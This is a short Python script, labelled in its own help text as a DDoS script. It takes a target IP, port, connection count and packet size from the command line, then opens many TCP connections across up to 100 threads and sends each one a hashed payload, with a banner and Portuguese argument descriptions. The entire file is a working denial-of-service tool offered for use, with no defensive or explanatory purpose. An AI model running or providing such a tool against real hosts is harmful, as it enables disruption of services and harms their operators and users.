import argparse
import socket
import os
import time
import hashlib
import threading

def attack(ip, port, size, connections):
    data = hashlib.sha512(str(size).encode()).hexdigest()
    addr = (ip, port)
    errors = 0
    socks = []
    
    for _ in range(connections):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        try:
            sock.connect_ex(addr)
            socks.append(sock)
        except socket.error:
            errors += 1

    if not socks:
        print(f"[-] Unable to establish any connections to {ip}:{port}")
        return

    print(f"[*] Launching Attack on {ip}:{port} with {connections} connections...")
    time.sleep(2.5)

    for sock in socks:
        try:
            sock.send(data.encode())
            sock.send('\r\n\r\n'.encode())
            print(f"Attacking {ip}:{port}")
        except socket.error:
            print("Connection Error")
            errors += 1

    for sock in socks:
        sock.close()

    print("[*] Attack finished")
    print(f"[-] {errors} Errors")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')

    print('''
    ____  _              ____            
   / ___|| |_ ___ _ __  |  _ \  _____   __
   \___ \| __/ _ \ '__| | | | |/ _ \ \ / /
    ___) | ||  __/ |    | |_| |  __/\ V / 
   |____/ \__\___|_|    |____/ \___| \_/  
    ''')

    parser = argparse.ArgumentParser(description="DDoS script to attack a target with multiple connections.")
    parser.add_argument('-i', '--ip', help='IP da maquina ou site alvo', required=True)
    parser.add_argument('-p', '--port', help='Porta para enviar pacotes', required=True, type=int)
    parser.add_argument('-c', '--connections', help='Numero de requisicoes', required=True, type=int)
    parser.add_argument('-s', '--size', help='Tamanho de pacotes', required=True, type=int)
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    size = args.size
    connections = args.connections

    num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack, args=(ip, port, size, connections // num_threads))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
